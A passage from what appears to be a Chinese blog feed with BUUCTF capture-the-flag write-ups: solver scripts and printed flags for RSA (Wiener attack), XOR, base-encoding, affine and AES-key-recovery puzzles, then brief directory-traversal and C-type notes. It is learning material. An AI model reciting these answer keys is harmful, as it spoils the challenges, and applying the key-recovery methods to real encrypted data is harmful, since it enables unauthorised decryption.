punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></pre></td></tr></table></figure><p>从题目可以看出，其名称为 Small d，并给出了一个人名 **<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvV2llbmVyJTI3c19hdHRhY2s=\">Michael J. Wiener</span>**，该攻击针对 RSA，当 d 很小时，攻击使用连分数法来暴露私钥 d。</p>\n<p>我们直接用 rsactftool 脚本跑</p>\n<pre><code>https://github.com/RsaCtfTool/RsaCtfTool\n</code></pre>\n<pre><code class=\"language-cmd\">python3 RsaCtfTool.py -n 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 -e 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 --uncipher 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 --attack wiener\n</code></pre>\n<p>得出以下内容：</p>\n<p><img data-src=\"image-20230928152305659.png\" alt=\"image-20230928152305659\"></p>\n<p>所以 flag 为： <code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyxor-task_3-简单的异或\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyxor-task_3-简单的异或\">#</a> BUUCTF - Crypto babyxor  task_3 简单的异或</h2>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>f <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></pre></td></tr></table></figure><p>利用在线转换工具将十六进制转换为二进制，得到前 5 个字符的二进制为：</p>\n<pre><code>11101001 11100011 11101110 11101000 11110100\n</code></pre>\n<p>我们可以猜测 前五个字母应该是 flag {，利用 ASCII 转二进制可以知道为：</p>\n<pre><code>01100110 01101100 01100001 01100111 01111011\n</code></pre>\n<p>异或：</p>\n<pre><code>10001111 10001111\n</code></pre>\n<p>可以知道异或密钥为 10001111。然后先利用 16 进制转 2 进制网站，将密文转换为 2 进制；再利用异或在线解密将密文转换为明文；最后用 2 进制转换为 ASCII 码，得到正确答案，flag：  <code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyencoding-task_3txt\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyencoding-task_3txt\">#</a> BUUCTF - Crypto babyencoding task_3.txt</h2>\n<p>题目如下所示：</p>\n<pre><code>part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=\npart 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=\npart 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`\n</code></pre>\n<p>第一行就是 Base64 编码，解码得到：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4\n</code></pre>\n<p>第二行使用 Base64 编码解码得到乱码：</p>\n<pre><code>1?  ?P  ? ?Q1  0?P0?  ??1?? ?R1?? ?\n</code></pre>\n<p>尝试使用 Base32 工具解码得到：</p>\n<pre><code>f0ca08d1e1d0f10c0c7afe422fea7\n</code></pre>\n<p>第三行应该是 UUencode，解码后得到：</p>\n<pre><code>c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>把答案拼起来试试：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>结果正确。</p>\n<h2 id=\"buuctf-crypto-affine-task_2-caesar-with-multiplication\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-affine-task_2-caesar-with-multiplication\">#</a> BUUCTF - Crypto Affine  task_2 Caesar with multiplication</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> key</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>f <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></pre></td></tr></table></figure><p>该题目为  <code>仿射</code> ，提示是  <code>凯撒和乘法</code></p>\n<p>先将密文前五位 16 进制转为 10 进制：</p>\n<pre><code>221 67 136 238 66\n</code></pre>\n<p>根据 modulus 为 256，判断密文应该是对应的 扩展的 ASCII 码。前五位字符原先应该是  <code>flag&#123;</code> ，其所对应的十进制数为：</p>\n<pre><code>102 108 97 103 123\n</code></pre>\n<p>进行暴力破解，我们知道 k0 的逆元 和 k1 的值一定不会大于 256：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">221</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">136</span><span class=\"token punctuation\">,</span><span class=\"token number\">238</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">]</span>   <span class=\"token comment\">#密文</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">103</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">]</span>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> k0 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> k1 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        y_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            y_<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k0<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> y_ <span class=\"token operator\">==</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k0为:'</span><span class=\"token punctuation\">,</span>k0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k1为:'</span><span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'y_为'</span><span class=\"token punctuation\">,</span>y_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>破解结果为：</p>\n<pre><code>k0的逆元 为: 241\nk1为: 23\n</code></pre>\n<p>利用求逆元函数得到，k0 为 17 （没有什么用了）</p>\n<p>根据密文转化为 10 进制数带入上述式子，得到明文 10 进制数为：</p>\n<pre><code>[102, 108, 97, 103, 123, 52, 102, 102, 49, 110, 101, 95, 99, 49, 112, 104, 101, 114, 95, 105, 53, 95, 118, 101, 114, 121, 95, 51, 97, 122, 121, 125]\n</code></pre>\n<p>再将其转化为 ASCII 码得到 flag： <code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyaes-task_1-了解下aes是什么\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyaes-task_1-了解下aes是什么\">#</a> BUUCTF - Crypto babyaes  task_1 了解下 aes 是什么</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> data <span class=\"token operator\">+</span> <span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'\\x00'</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    flag_ <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    iv <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> bytes_to_long<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    enc_flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr></table></figure><p>该题目为 AES 加密，使用了一个密钥 key 和初始化向量 iv，选择的 CBC 模式加密。</p>\n<p>先分析一下题目中的几个关键函数和方法：</p>\n<pre><code>urandom:\n\n语法  os.urandom（size）\n参数：\n\tsize:字符串随机字节的大小\n\t返回值：该方法返回一个字符串，该字符串表示适合加密使用的随机字节。\n例 os.urandom(1)\n输出：b'\\x91'\n二进制：10010001 （8bits）\n</code></pre>\n<pre><code>AES.new(key, mode, *args, **kwargs)\n\nparam key(参数密钥):\n在对称密码中使用的秘密密钥。\n\n它必须为16、24或32个字节长（分别用于AES-128， AES-192或AES-256）。\n\nmode（模式）\n模式（支持的MODE_*常量之一）–用于加密或解密的链接模式。\n学习链接：https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html\n\nKeyword Arguments（关键字参数）：\nIV（字节，字节组，memoryview） - （只适用于MODE_CBC，MODE_CFB，MODE_OFB，和MODE_OPENPGP模式）。\n\n用于加密或解密的初始化向量。\n\n对于MODE_CBC，MODE_CFB和MODE_OFB它必须是16个字节。\n</code></pre>\n<p>解题思路：<br>\n解密 flag 我们需要获取到 key 和 iv 的值，由条件：<br>\nkey=os.urandom(16)*2<br>\niv=os.urandom(16)<br>\n 可知：key 是 32bytes,256bits ；iv 是 16bytes ,128bits</p>\n<p>key^iv ，那么只有 iv 与 key 的低 128 位相异或，所以 key 的高 128 位是固定不变的。所以输出结果的高 128bits, 就是 key 的高 128bits, 进而可以得到 key 的所有值 256bits。之后 key 的低 128bits，与输出结果的低 128bits 相异或，所得结果就是 iv 的值了。key,iv 得到后直接 aes.decrypt () 解密就 ok 了。<br>\n代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token number\">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> <span class=\"token string\">b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>out <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>xor<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>key <span class=\"token operator\">=</span> out<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key为:'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>iv <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>bytes_to_long<span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(iv)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>iv <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iv为:'</span><span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行后得到： <code>b'firsT_cry_Aes\\x00\\x00\\x01'</code> ，其中  <code>firsT_cry_Aes</code>  是我们需要的内容，其余部分只是填充使字符串长度达到 16。所以最终的 flag 为  <code>flag&#123;firsT_cry_Aes&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "url": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "title": "目录遍历",
            "date_published": "2023-09-20T00:44:10.000Z",
            "content_html": "<h1 id=\"目录遍历\"><a class=\"markdownIt-Anchor\" href=\"#目录遍历\">#</a> 目录遍历</h1>\n<p>打开题目可以看到如下页面，该题本质上就是遍历所有目录找取 flag。目录数目不多，所以一个一个点击查找就可以找到。</p>\n<p><img data-src=\"image-20230920084821330.png\" alt=\"image-20230920084821330\"></p>\n<p>找到  <code>flag.txt</code>  文件</p>\n<p><img data-src=\"image-20230920085047645.png\" alt=\"image-20230920085047645\"></p>\n<p>打开得到  <code>flag</code>  为</p>\n<pre><code>ctfhub&#123;bcd6fcf15f15f45dd0cf1a0c&#125;\n</code></pre>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "url": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "title": "斯坦福编程范式CS107_2",
            "date_published": "2023-09-19T12:28:00.000Z",
            "content_html": "<h2 id=\"斯坦福编程范式cs107_2\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_2\">#</a> 斯坦福编程范式 CS107_2</h2>\n<table>\n<thead>\n<tr>\n<th><strong>C/C++</strong></th>\n<th style=\"text-align:left\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bool</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td>char</td>\n<td style=\"text-align:left\">1  byte</td>\n</tr>\n<tr>\n<td>short</td>\n<td style=\"text-align:left\">2  bytes</td>\n</tr>\n<tr>\n<td>int</td>\n<td style=\"text-align:left\">2–4 bytes</td>\n</tr>\n<tr>\n<td>long</td>\n<td style=\"text-align:left\">4 bytes</td>\n</tr>\n<tr>\n<td>long long</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n<tr>\n<td>float</td>\n<td style=\"text-align:left\">4  bytes</td>\n</tr>\n<tr>\n<td>double</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\"><a class=\"markdownIt-Anchor\" href=\"#1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\">#</a> 1.\t为什么二进制中不简单的将 1 置在最左侧表示负数（如，-3 为 1011）</h4>\n<p>因为如果是这样的话，-3 + 3 将等于：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1011</span> <span class=\"token operator\">+</span> <span class=\"token number\">0011</span> <span class=\"token operator\">=</span> <span class=\"token number\">1110</span></pre></td></tr></table></figure><p>显然结果是 -6 而不是 0。所以为了使正负数相加得到全 0 或全 1，如：</p>\n<figure class=\"highlight c\"><figcaption 